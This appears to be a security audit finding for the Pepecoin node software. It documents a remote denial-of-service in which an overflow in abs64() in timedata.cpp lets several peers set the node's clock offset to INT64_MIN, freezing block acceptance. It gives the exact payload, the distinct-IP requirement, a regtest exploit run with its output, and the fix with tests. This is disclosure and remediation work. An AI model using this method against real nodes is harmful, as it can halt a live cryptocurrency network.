# PEP-001 (weaponized) — Remote consensus-liveness freeze via network-time UB

**Escalation:** MEDIUM (per-node time-offset DoS) → **HIGH** (remote, low-cost,
persistent freeze of any reachable listening node; scalable to a network-wide
block-production/propagation halt).

**Honest ceiling — why this is HIGH, not CRITICAL.** The attack is a *liveness /
availability* break, not a *safety* break. A poisoned node rejects **every**
block (its own and every peer's) — it never accepts a *different* attacker chain,
so it cannot be turned into inflation, a persistent consensus split, or a
double-spend. It recovers on restart. No coins are created or stolen. Under the
audit rubric that is HIGH ("serious DoS / consensus-liveness"), not CRITICAL.
I did not find a bug that mints or steals PEPE, and I am not labeling this one as
if it did.

---

## 1. Root cause

`src/timedata.cpp` (the audited commit `4fb5a0c`) clamps peer-supplied time
offsets with `abs64()`:

```c
static int64_t abs64(int64_t n) { return (n >= 0 ? n : -n); }
...
if (abs64(nMedian) <= std::max<int64_t>(0, GetArg("-maxtimeadjustment", DEFAULT_MAX_TIME_ADJUSTMENT)))
    nTimeOffset = nMedian;      // accept the median as our clock offset
```

`abs64(INT64_MIN)` computes `-INT64_MIN`, which overflows a signed 64-bit int —
**undefined behavior**. In practice it evaluates to `INT64_MIN` again (still
*negative*), so the guard `abs64(nMedian) <= max_adjustment` is
`INT64_MIN <= 4200` → **true**, and the node adopts
`nTimeOffset = INT64_MIN` — ~292 billion years off, wildly outside the
±`maxtimeadjustment` (default ±70 min) clamp the code exists to enforce.

### The one subtlety that makes the PoC work

The attacker controls a peer's `version.nTime`; the node stores the *offset*
`sample = nTime − GetTime()`. `abs64` is only wrong for **exactly** `INT64_MIN`.
So the attacker must make the *offset* equal `INT64_MIN`, i.e. send

```
nTime = INT64_MIN + <the node's current unix second>
```

Sending a raw `INT64_MIN` instead makes `INT64_MIN − GetTime()` *underflow* to a
large positive value, which the clamp correctly rejects (this is the dead end
the first PoC attempt hit). Node clocks are NTP-synced to the second, so this is
trivially predictable; the exploit aligns to a whole second and sprays a few
distinct IPs to guarantee a hit.

### Why a few distinct IPs are needed

`AddTimeData` de-duplicates samples **by source IP** (`static std::set<CNetAddr>
setKnown`) and only updates the offset when the sample count is **odd and ≥ 5**,
taking the **median**. So the attacker needs to own the median: a handful of
distinct-IP peers each contributing an `INT64_MIN` offset. The PoC uses 8
distinct loopback source IPs (`127.0.0.2 … 127.0.0.9`); on a real network any
small IP fleet (e.g. a /24) suffices.

---

## 2. Impact chain (why the node freezes)

```
nTimeOffset = INT64_MIN
   → GetAdjustedTime() = GetTime() + INT64_MIN  ≈ −9.2e18   (validation uses this)
      → ContextualCheckBlockHeader (validation.cpp:3110):
           if (block.GetBlockTime() > nAdjustedTime + 2h) reject "time-too-new"
        Every real block has a timestamp ≈ 1.7e9  >>  (−9.2e18 + 7200)
      → EVERY block header — self-mined and peer-relayed — is rejected as
        "time-too-new"
   → the node cannot extend, cannot accept the honest chain: FROZEN at its tip.
```

Because `setKnown` caps at 200 and never evicts, once the attacker seeds a
majority of `INT64_MIN` samples the median stays `INT64_MIN` and the freeze
**persists until the node is restarted** — it is not self-healing.

**Scale.** Repeat against every reachable listening node (miners, exchanges,
seed nodes) and the network stops producing/propagating blocks — a network-wide
liveness failure — for as long as the attacker holds the median on each victim.

---

## 3. Proof of Concept (isolated regtest only)

Exploit client: `qa/rpc-tests/pepecoin_timewarp_exploit.py` — a dependency-free
raw-socket P2P client that binds distinct loopback source IPs and sends `version`
messages carrying `nTime = INT64_MIN + node_second`. **It only ever connects to
`127.0.0.1` and touches no external host.**

### 3a. Build a vulnerable and a fixed binary

```bash
# fixed binary = current tree (the fix in this branch)
make -C src pepecoind && cp src/pepecoind /tmp/pepecoind-fixed

# vulnerable binary = restore the pre-fix timedata.cpp, rebuild, then restore
git show 4fb5a0c:src/timedata.cpp > src/timedata.cpp
make -C src pepecoind && cp src/pepecoind /tmp/pepecoind-vuln
git checkout src/timedata.cpp
```

### 3b. Start an isolated regtest node (VULNERABLE) that listens

```bash
mkdir -p /tmp/vulnnode
cat > /tmp/vulnnode/pepecoin.conf <<'EOF'
regtest=1
server=1
listen=1
bind=127.0.0.1
discover=0
rpcuser=u
rpcpassword=p
rpcport=19445
port=19444
maxconnections=200
EOF
/tmp/pepecoind-vuln -datadir=/tmp/vulnnode -daemon
CLI="./src/pepecoin-cli -datadir=/tmp/vulnnode -rpcport=19445 -rpcuser=u -rpcpassword=p"
$CLI generate 3
$CLI getnetworkinfo | grep timeoffset          # -> 0
```

### 3c. Fire the exploit and observe the freeze

```bash
# 8 hostile version messages from 127.0.0.2..127.0.0.9, offset == INT64_MIN
python3 qa/rpc-tests/pepecoin_timewarp_exploit.py 19444 8
$CLI getnetworkinfo | grep timeoffset          # -> -9223372036854775808  (INT64_MIN)
$CLI generate 1                                # -> ERROR: time-too-new  (node frozen)
$CLI getblockcount                             # -> still 3, cannot advance
```

**Observed output (this run):**

```
targeting node second T=1786449844, nTime=INT64_MIN+T=-9223372035068325964
sent 8 hostile version messages (offset == INT64_MIN) from distinct IPs
timeoffset AFTER exploit: -9223372036854775808
generate 1 -> error: CreateNewBlock: TestBlockValidity failed: time-too-new,
              block timestamp too far in the future (code 16)
debug.log  -> ERROR: TestBlockValidity: Consensus::ContextualCheckBlockHeader:
              time-too-new, block timestamp too far in the future (code 16)
```

The same `ContextualCheckBlockHeader` gate runs in `AcceptBlockHeader` for
peer-relayed headers, so the node likewise rejects every block it receives from
the network — not just the ones it tries to mine.

---

## 4. The fix

Compare against the signed bounds directly and delete `abs64` — this is exactly
what upstream Dogecoin did in 1.14.8 ("Avoid the use of abs64 in timedata").
Applied in this branch (`src/timedata.cpp`):

```diff
-static int64_t abs64(int64_t n) { return (n >= 0 ? n : -n); }
-...
-        if (abs64(nMedian) <= std::max<int64_t>(0, GetArg("-maxtimeadjustment", DEFAULT_MAX_TIME_ADJUSTMENT)))
-        {
+        int64_t max_adjustment = std::max<int64_t>(0, GetArg("-maxtimeadjustment", DEFAULT_MAX_TIME_ADJUSTMENT));
+        if (nMedian >= -max_adjustment && nMedian <= max_adjustment) {
             nTimeOffset = nMedian;
         }
```

`nMedian >= -max_adjustment && nMedian <= max_adjustment` is total over all
`int64_t` (no negation, no UB): `INT64_MIN >= -4200` is **false**, so an
`INT64_MIN` median takes the `else` branch (`nTimeOffset = 0` + the standard
"check your clock" warning) instead of being adopted. The other two `abs64`
uses in the warning path are replaced with the equivalent signed-range form, and
the now-unused `abs64`/`<boost/foreach.hpp>` are removed. Post-fix
`src/timedata.cpp` is functionally identical to Dogecoin 1.14.9.

---

## 5. Verify the fix

### 5a. Deterministic unit test (no network)

`src/test/pepecoin_timedata_tests.cpp` drives `AddTimeData` directly with four
distinct addresses and `INT64_MIN`:

```bash
./src/test/test_pepecoin --run_test=pepecoin_timedata_tests
# vulnerable code: FAILS  -> "peers moved nTimeOffset to -9223372036854775808, outside the +/-4200 clamp"
# fixed code:      PASSES -> nTimeOffset stays 0, GetAdjustedTime() sane
```

### 5b. End-to-end on the FIXED binary (same exploit)

```bash
/tmp/pepecoind-fixed -datadir=/tmp/fixednode -daemon      # (listen=1, port=19544/rpc 19545)
CF="./src/pepecoin-cli -datadir=/tmp/fixednode -rpcport=19545 -rpcuser=u -rpcpassword=p"
$CF generate 3
for i in $(seq 8); do python3 qa/rpc-tests/pepecoin_timewarp_exploit.py 19544 8; done
$CF getnetworkinfo | grep timeoffset     # -> 0  (clamp holds through 8 rounds)
$CF generate 1 && $CF getblockcount      # -> succeeds, height advances (node NOT frozen)
```

**Observed:** across 8 exploit rounds the fixed node's `timeoffset` stays `0`
and it keeps mining (height advances 3 → 4), while the vulnerable node under the
identical attack is stuck at height 3 with `timeoffset = INT64_MIN`.

---

## 6. Hardening notes beyond the one-line fix

- Cap the *sample* itself to a sane range in `AddTimeData` before it enters the
  median filter (defense-in-depth against any future arithmetic mistake in the
  clamp).
- Consider ignoring time samples from inbound peers entirely (only outbound /
  manually-added peers influence the clock), which removes the Sybil surface.
- Backport the rest of the Dogecoin 1.14.8 P2P hardening (see PEP-005) so a
  single connection cannot cheaply amplify load while probing for this.
